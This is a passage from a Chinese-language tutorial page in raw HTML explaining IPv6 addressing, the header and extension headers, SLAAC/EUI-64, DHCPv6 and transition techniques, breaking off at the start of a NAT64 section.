相当于IPv4的127.0.0.1<br><br><span class="hljs-bullet">5.</span> 未指定地址<br><span class="hljs-bullet">   -</span> 地址：::<br><span class="hljs-bullet">   -</span> 相当于IPv4的0.0.0.0<br><span class="hljs-bullet">   -</span> 表示&quot;无地址&quot;<br></code></pre></td></tr></table></figure><p><strong>任播地址（Anycast）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">任播 = 发送给多个接口中最近的一个<br><br>特点：<br><span class="hljs-bullet">- </span>多个节点共享相同地址<br><span class="hljs-bullet">- </span>数据包发送给最近的节点<br><span class="hljs-bullet">- </span>用于负载均衡<br><br>使用：<br><span class="hljs-bullet">- </span>相同格式的单播地址<br><span class="hljs-bullet">- </span>通过路由配置实现<br><br>应用场景：<br><span class="hljs-bullet">- </span>DNS根服务器<br><span class="hljs-bullet">- </span>CDN<br><span class="hljs-bullet">- </span>负载均衡<br></code></pre></td></tr></table></figure><p><strong>多播地址（Multicast）</strong>：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ldif">多播 = 一对多通信<br><br>前缀：ff00::/8<br><br>格式：<br>ff&lt;flags&gt;&lt;scope&gt;:....<br><br>Flags：<br><span class="hljs-literal">-</span> 0：永久分配<br><span class="hljs-literal">-</span> 1：临时分配<br><br>Scope（范围）：<br><span class="hljs-literal">-</span> 1：接口本地<br><span class="hljs-literal">-</span> 2：链路本地<br><span class="hljs-literal">-</span> 5：站点本地<br><span class="hljs-literal">-</span> 8：组织本地<br><span class="hljs-literal">-</span> e：全球<br><br>常用多播地址：<br><span class="hljs-attribute">ff02</span>::1  - 所有节点（链路本地）<br><span class="hljs-attribute">ff02</span>::2  - 所有路由器（链路本地）<br><span class="hljs-attribute">ff02</span>::1:ff00:0/104 - 请求节点多播地址<br></code></pre></td></tr></table></figure><p><strong>IPv6没有广播</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPv6取消了广播<br><br>原因：<br><span class="hljs-bullet">- </span>广播效率低<br><span class="hljs-bullet">- </span>占用带宽<br><span class="hljs-bullet">- </span>影响所有节点<br><br>替代方案：<br>使用多播<br>更精确，更高效<br></code></pre></td></tr></table></figure><h3 id="2-4-特殊地址"><a href="#2-4-特殊地址" class="headerlink" title="2.4 特殊地址"></a>2.4 特殊地址</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">::1/128<br><span class="hljs-bullet">- </span>环回地址<br><span class="hljs-bullet">- </span>本地主机<br><br>::/128<br><span class="hljs-bullet">- </span>未指定地址<br><span class="hljs-bullet">- </span>没有地址时使用<br><br>fe80::/10<br><span class="hljs-bullet">- </span>链路本地地址<br><span class="hljs-bullet">- </span>自动配置<br><br>ff00::/8<br><span class="hljs-bullet">- </span>多播地址<br><br>2001:db8::/32<br><span class="hljs-bullet">- </span>文档地址<br><span class="hljs-bullet">- </span>仅用于文档和示例<br><span class="hljs-bullet">- </span>不能在互联网路由<br><br><span class="hljs-meta">::ffff:0:0/96</span><br><span class="hljs-bullet">- </span>IPv4映射地址<br><span class="hljs-bullet">- </span>表示IPv4地址<br><br>64:ff9b::/96<br><span class="hljs-bullet">- </span>IPv4/IPv6转换<br><span class="hljs-bullet">- </span>NAT64使用<br></code></pre></td></tr></table></figure><hr><h2 id="3-IPv6报文格式"><a href="#3-IPv6报文格式" class="headerlink" title="3. IPv6报文格式"></a>3. IPv6报文格式</h2><h3 id="3-1-IPv6基本头部"><a href="#3-1-IPv6基本头部" class="headerlink" title="3.1 IPv6基本头部"></a>3.1 IPv6基本头部</h3><p><strong>固定40字节头部</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|Version| Traffic Class |           Flow Label                  |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|         Payload Length        |  Next Header  |   Hop Limit   |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                                                               |<br><span class="hljs-code">+                                                               +</span><br>|                                                               |<br><span class="hljs-code">+                         Source Address                        +</span><br>|                                                               |<br><span class="hljs-code">+                                                               +</span><br><span class="hljs-section">|                                                               |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                                                               |<br><span class="hljs-code">+                                                               +</span><br>|                                                               |<br><span class="hljs-code">+                      Destination Address                      +</span><br>|                                                               |<br><span class="hljs-code">+                                                               +</span><br><span class="hljs-section">|                                                               |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></code></pre></td></tr></table></figure><p><strong>字段说明</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Version（版本，4位）：<br><span class="hljs-bullet">-</span> 值为6<br><br>Traffic Class（流量类别，8位）：<br><span class="hljs-bullet">-</span> 相当于IPv4的ToS<br><span class="hljs-bullet">-</span> 用于QoS<br><br>Flow Label（流标签，20位）：<br><span class="hljs-bullet">-</span> 标识一个流<br><span class="hljs-bullet">-</span> 用于QoS保证<br><span class="hljs-bullet">-</span> 同一流的包有相同标签<br><br>Payload Length（有效载荷长度，16位）：<br><span class="hljs-bullet">-</span> 载荷（数据+扩展头部）的长度<br><span class="hljs-bullet">-</span> 单位：字节<br><span class="hljs-bullet">-</span> 不包括基本头部的40字节<br><br>Next Header（下一个头部，8位）：<br><span class="hljs-bullet">-</span> 指示下一个头部的类型<br><span class="hljs-bullet">-</span> 相当于IPv4的Protocol字段<br><span class="hljs-bullet">-</span> 值：<br><span class="hljs-bullet">  -</span> 6：TCP<br><span class="hljs-bullet">  -</span> 17：UDP<br><span class="hljs-bullet">  -</span> 58：ICMPv6<br><span class="hljs-bullet">  -</span> 43：路由扩展头部<br><span class="hljs-bullet">  -</span> 44：分片扩展头部<br><span class="hljs-bullet">  -</span> 等等<br><br>Hop Limit（跳数限制，8位）：<br><span class="hljs-bullet">-</span> 相当于IPv4的TTL<br><span class="hljs-bullet">-</span> 每经过一个路由器减1<br><span class="hljs-bullet">-</span> 为0时丢弃<br><br>Source Address（源地址，128位）：<br><span class="hljs-bullet">-</span> 发送方IPv6地址<br><br>Destination Address（目的地址，128位）：<br><span class="hljs-bullet">-</span> 接收方IPv6地址<br></code></pre></td></tr></table></figure><h3 id="3-2-IPv6扩展头部"><a href="#3-2-IPv6扩展头部" class="headerlink" title="3.2 IPv6扩展头部"></a>3.2 IPv6扩展头部</h3><p><strong>扩展头部链</strong>：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs lasso">IPv6的灵活性：扩展头部<br><br>IPv6基本头部（<span class="hljs-number">40</span>字节）<br>    ↓ Next <span class="hljs-keyword">Header</span><br>扩展头部<span class="hljs-number">1</span>（可选）<br>    ↓ Next <span class="hljs-keyword">Header</span><br>扩展头部<span class="hljs-number">2</span>（可选）<br>    ↓ Next <span class="hljs-keyword">Header</span><br><span class="hljs-params">...</span><br>    ↓ Next <span class="hljs-keyword">Header</span><br>上层协议（TCP/UDP等）<br><br>优点：<br>✅ 只在需要时添加<br>✅ 提高路由效率（基本头部固定）<br>✅ 灵活扩展<br></code></pre></td></tr></table></figure><p><strong>常见扩展头部</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 逐跳选项头部（Hop-by-Hop Options）<br><span class="hljs-bullet">   -</span> Next Header = 0<br><span class="hljs-bullet">   -</span> 每个路由器都要处理<br><br><span class="hljs-bullet">2.</span> 路由头部（Routing Header）<br><span class="hljs-bullet">   -</span> Next Header = 43<br><span class="hljs-bullet">   -</span> 指定路由路径<br><br><span class="hljs-bullet">3.</span> 分片头部（Fragment Header）<br><span class="hljs-bullet">   -</span> Next Header = 44<br><span class="hljs-bullet">   -</span> 用于分片和重组<br><br><span class="hljs-bullet">4.</span> 目的选项头部（Destination Options）<br><span class="hljs-bullet">   -</span> Next Header = 60<br><span class="hljs-bullet">   -</span> 只有目的节点处理<br><br><span class="hljs-bullet">5.</span> 认证头部（Authentication Header，AH）<br><span class="hljs-bullet">   -</span> Next Header = 51<br><span class="hljs-bullet">   -</span> IPSec认证<br><br><span class="hljs-bullet">6.</span> 封装安全载荷（ESP）<br><span class="hljs-bullet">   -</span> Next Header = 50<br><span class="hljs-bullet">   -</span> IPSec加密<br><br>推荐顺序：<br>基本头部 → 逐跳 → 目的 → 路由 → 分片 → 认证 → ESP → 目的 → 上层协议<br></code></pre></td></tr></table></figure><h3 id="3-3-IPv6-vs-IPv4报文对比"><a href="#3-3-IPv6-vs-IPv4报文对比" class="headerlink" title="3.3 IPv6 vs IPv4报文对比"></a>3.3 IPv6 vs IPv4报文对比</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs smali">┌────────────────────┬──────────────┬──────────────┐<br>│      特性          │    IPv4      │    IPv6      │<br>├────────────────────┼──────────────┼──────────────┤<br>│ 地址长度           │   32位       │   128位      │<br>│ 头部长度           │  20-60字节   │   40字节     │<br>│ 头部格式           │   可变       │   固定       │<br>│ 校验和             │    有        │    无        │<br>│ 分片               │ 路由器可分片 │ 只有源节点   │<br>│ 选项               │ 头部内       │  扩展头部    │<br>│ 广播               │    支持      │   不支持     │<br>│ 多播               │    可选      │   内置       │<br>│ 任播               │   不支持     │   支持       │<br>│ IPSec              │    可选      │   强制       │<br>│ 配置               │ 手动/DHCP    │ 自动/DHCPv6  │<br>└────────────────────┴──────────────┴──────────────┘<br><br>简化：<br>IPv6去掉了：<br>❌ 头部校验和（让上层协议处理）<br>❌ 选项字段（改用扩展头部）<br>❌ 分片字段（只有源节点分片）<br><br>IPv6添加了：<br>✅ 流标签<br>✅ 扩展头部机制<br>✅ 更大的地址空间<br></code></pre></td></tr></table></figure><hr><h2 id="4-IPv6地址配置"><a href="#4-IPv6地址配置" class="headerlink" title="4. IPv6地址配置"></a>4. IPv6地址配置</h2><h3 id="4-1-无状态地址自动配置（SLAAC）"><a href="#4-1-无状态地址自动配置（SLAAC）" class="headerlink" title="4.1 无状态地址自动配置（SLAAC）"></a>4.1 无状态地址自动配置（SLAAC）</h3><p><strong>工作原理</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs markdown">SLAAC = Stateless Address Autoconfiguration<br>无状态地址自动配置<br><br>过程：<br><br><span class="hljs-bullet">1.</span> 生成链路本地地址<br><span class="hljs-bullet">   -</span> 前缀：fe80::/64<br><span class="hljs-bullet">   -</span> 接口ID：从MAC地址生成（EUI-64）<br><span class="hljs-bullet">   -</span> 示例：fe80::xxxx:xxxx:xxxx:xxxx<br><br><span class="hljs-bullet">2.</span> 重复地址检测（DAD）<br><span class="hljs-bullet">   -</span> 发送邻居请求（Neighbor Solicitation）<br><span class="hljs-bullet">   -</span> 如果无响应，地址可用<br><br><span class="hljs-bullet">3.</span> 路由器发现<br><span class="hljs-bullet">   -</span> 发送路由器请求（Router Solicitation）<br><span class="hljs-bullet">   -</span> 或等待路由器通告（Router Advertisement）<br><br><span class="hljs-bullet">4.</span> 生成全局地址<br><span class="hljs-bullet">   -</span> 从RA获取前缀（如2001:db8::/64）<br><span class="hljs-bullet">   -</span> 加上接口ID<br><span class="hljs-bullet">   -</span> 得到全局地址：2001:db8::xxxx:xxxx:xxxx:xxxx<br><br><span class="hljs-bullet">5.</span> 再次DAD<br><span class="hljs-bullet">   -</span> 确保全局地址唯一<br><br>完成！即插即用，无需DHCP<br></code></pre></td></tr></table></figure><p><strong>EUI-64接口标识符</strong>：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">从<span class="hljs-variable">MAC</span>地址生成接口<span class="hljs-variable">ID</span>：<br><br><span class="hljs-variable">MAC</span>地址（<span class="hljs-number">48</span>位）：<br><span class="hljs-number">00</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-variable">A</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-variable">B</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-built_in">C</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-built_in">D</span><span class="hljs-operator">:</span><span class="hljs-number">5</span><span class="hljs-built_in">E</span><br><br>步骤：<br><span class="hljs-number">1.</span> 插入<span class="hljs-variable">FF</span><span class="hljs-operator">:</span><span class="hljs-variable">FE</span><br>   <span class="hljs-number">00</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-variable">A</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-variable">B</span><span class="hljs-operator">:</span><span class="hljs-variable">FF</span><span class="hljs-operator">:</span><span class="hljs-variable">FE</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-built_in">C</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-built_in">D</span><span class="hljs-operator">:</span><span class="hljs-number">5</span><span class="hljs-built_in">E</span><br><br><span class="hljs-number">2.</span> 反转第<span class="hljs-number">7</span>位（本地<span class="hljs-operator">/</span>全球位）<br>   <span class="hljs-number">00</span> <span class="hljs-operator">=</span> <span class="hljs-number">00000000</span><br>   反转第<span class="hljs-number">7</span>位 <span class="hljs-operator">=</span> <span class="hljs-number">00000010</span> <span class="hljs-operator">=</span> <span class="hljs-number">02</span><br><br>结果：<br><span class="hljs-number">02</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-variable">A</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-variable">B</span><span class="hljs-operator">:</span><span class="hljs-variable">FF</span><span class="hljs-operator">:</span><span class="hljs-variable">FE</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-built_in">C</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-built_in">D</span><span class="hljs-operator">:</span><span class="hljs-number">5</span><span class="hljs-built_in">E</span><br><br>接口<span class="hljs-variable">ID</span>：<br><span class="hljs-number">021</span><span class="hljs-variable">a</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-variable">bff</span><span class="hljs-operator">:</span><span class="hljs-variable">fe3c</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-variable">d5e</span><br><br>完整地址：<br><span class="hljs-number">2001</span><span class="hljs-operator">:</span><span class="hljs-variable">db8</span><span class="hljs-operator">::</span><span class="hljs-number">021</span><span class="hljs-variable">a</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-variable">bff</span><span class="hljs-operator">:</span><span class="hljs-variable">fe3c</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-variable">d5e</span><br><br>简化：<br><span class="hljs-number">2001</span><span class="hljs-operator">:</span><span class="hljs-variable">db8</span><span class="hljs-operator">::</span><span class="hljs-number">21</span><span class="hljs-variable">a</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-variable">bff</span><span class="hljs-operator">:</span><span class="hljs-variable">fe3c</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-variable">d5e</span><br></code></pre></td></tr></table></figure><p><strong>隐私扩展</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">问题：<br>EUI-64使用MAC地址<br>→ 地址包含硬件信息<br>→ 可以跟踪设备<br>→ 隐私问题<br><br>解决方案：<br>隐私扩展（Privacy Extensions，RFC 4941）<br><br>特点：<br><span class="hljs-bullet">- </span>随机生成接口ID<br><span class="hljs-bullet">- </span>定期更换<br><span class="hljs-bullet">- </span>临时地址<br><br>结果：<br>主机有多个IPv6地址：<br><span class="hljs-bullet">- </span>链路本地地址（fe80::）<br><span class="hljs-bullet">- </span>永久全局地址（基于EUI-64）<br><span class="hljs-bullet">- </span>临时地址（隐私扩展）<br></code></pre></td></tr></table></figure><h3 id="4-2-DHCPv6"><a href="#4-2-DHCPv6" class="headerlink" title="4.2 DHCPv6"></a>4.2 DHCPv6</h3><p><strong>有状态配置</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown">DHCPv6 = 类似IPv4的DHCP<br><br>使用场景：<br><span class="hljs-bullet">-</span> 需要DNS服务器地址<br><span class="hljs-bullet">-</span> 需要中央管理<br><span class="hljs-bullet">-</span> 需要特定地址分配<br><br>工作模式：<br><br><span class="hljs-bullet">1.</span> 有状态DHCPv6（Stateful）<br><span class="hljs-bullet">   -</span> 分配完整地址<br><span class="hljs-bullet">   -</span> 类似IPv4 DHCP<br><br><span class="hljs-bullet">2.</span> 无状态DHCPv6（Stateless）<br><span class="hljs-bullet">   -</span> 地址通过SLAAC获取<br><span class="hljs-bullet">   -</span> DHCPv6只提供其他信息（DNS等）<br><br>消息类型：<br><span class="hljs-bullet">-</span> SOLICIT：客户端请求<br><span class="hljs-bullet">-</span> ADVERTISE：服务器通告<br><span class="hljs-bullet">-</span> REQUEST：客户端请求地址<br><span class="hljs-bullet">-</span> REPLY：服务器响应<br></code></pre></td></tr></table></figure><h3 id="4-3-配置方式对比"><a href="#4-3-配置方式对比" class="headerlink" title="4.3 配置方式对比"></a>4.3 配置方式对比</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs smali">┌─────────────┬──────────┬──────────┬──────────┐<br>│   特性      │  SLAAC   │无状态DHCPv6│有状态DHCPv6│<br>├─────────────┼──────────┼──────────┼──────────┤<br>│ 地址获取    │   RA     │    RA    │  DHCPv6  │<br>│ DNS获取     │   ❌     │    ✅    │    ✅    │<br>│ 中央管理    │   ❌     │    ❌    │    ✅    │<br>│ 部署复杂度  │   低     │    中    │    高    │<br>│ 即插即用    │   ✅     │    ✅    │    ❌    │<br>└─────────────┴──────────┴──────────┴──────────┘<br><br>推荐：<br>- 家庭网络：SLAAC<br>- 企业网络：有状态DHCPv6<br>- 混合环境：无状态DHCPv6<br></code></pre></td></tr></table></figure><hr><h2 id="5-IPv6过渡技术"><a href="#5-IPv6过渡技术" class="headerlink" title="5. IPv6过渡技术"></a>5. IPv6过渡技术</h2><h3 id="5-1-双栈（Dual-Stack）"><a href="#5-1-双栈（Dual-Stack）" class="headerlink" title="5.1 双栈（Dual Stack）"></a>5.1 双栈（Dual Stack）</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs smali">双栈 = IPv4 + IPv6同时运行<br><br>原理：<br>主机同时配置IPv4和IPv6地址<br><br>┌──────────────────┐<br>│   应用程序       │<br>├──────────────────┤<br>│  IPv4   │  IPv6  │<br>├──────────────────┤<br>│   传输层（TCP）  │<br>├──────────────────┤<br>│  物理层          │<br>└──────────────────┘<br><br>优点：<br>✅ 兼容性好<br>✅ 平滑过渡<br>✅ 应用无需修改<br><br>缺点：<br>❌ 需要IPv4和IPv6双份资源<br>❌ 管理复杂<br><br>使用场景：<br>- 过渡初期<br>- 长期共存<br></code></pre></td></tr></table></figure><h3 id="5-2-隧道技术（Tunneling）"><a href="#5-2-隧道技术（Tunneling）" class="headerlink" title="5.2 隧道技术（Tunneling）"></a>5.2 隧道技术（Tunneling）</h3><p><strong>6to4隧道</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown">IPv6数据包封装在IPv4中<br><br>原理：<br>[IPv6数据包]<br><span class="hljs-code">    ↓ 封装</span><br><span class="hljs-code">[IPv4头部 | IPv6数据包]</span><br><span class="hljs-code">    ↓ 传输（IPv4网络）</span><br><span class="hljs-code">[IPv4头部 | IPv6数据包]</span><br><span class="hljs-code">    ↓ 解封装</span><br><span class="hljs-code">[IPv6数据包]</span><br><span class="hljs-code"></span><br>类型：<br><br><span class="hljs-bullet">1.</span> 6to4<br><span class="hljs-bullet">   -</span> 自动隧道<br><span class="hljs-bullet">   -</span> 地址前缀：2002::/16<br><span class="hljs-bullet">   -</span> 包含IPv4地址<br><br><span class="hljs-bullet">2.</span> 6in4（手动隧道）<br><span class="hljs-bullet">   -</span> 手动配置<br><span class="hljs-bullet">   -</span> 点对点<br><br><span class="hljs-bullet">3.</span> Teredo<br><span class="hljs-bullet">   -</span> 穿越NAT<br><span class="hljs-bullet">   -</span> 地址前缀：2001:0::/32<br><span class="hljs-bullet">   -</span> Windows内置<br><br><span class="hljs-bullet">4.</span> ISATAP<br><span class="hljs-bullet">   -</span> 企业内部<br><span class="hljs-bullet">   -</span> 站点内自动隧道<br></code></pre></td></tr></table></figure><h3 id="5-3-转换技术（Translation）"><a href="#5-3-转换技术（Translation）" class="headerlink" title="5.3 转换技术（Translation）"></a>5.3 转换技术（Translation）</h3><p><strong>NAT64</strong>：</p><figure class="highlight 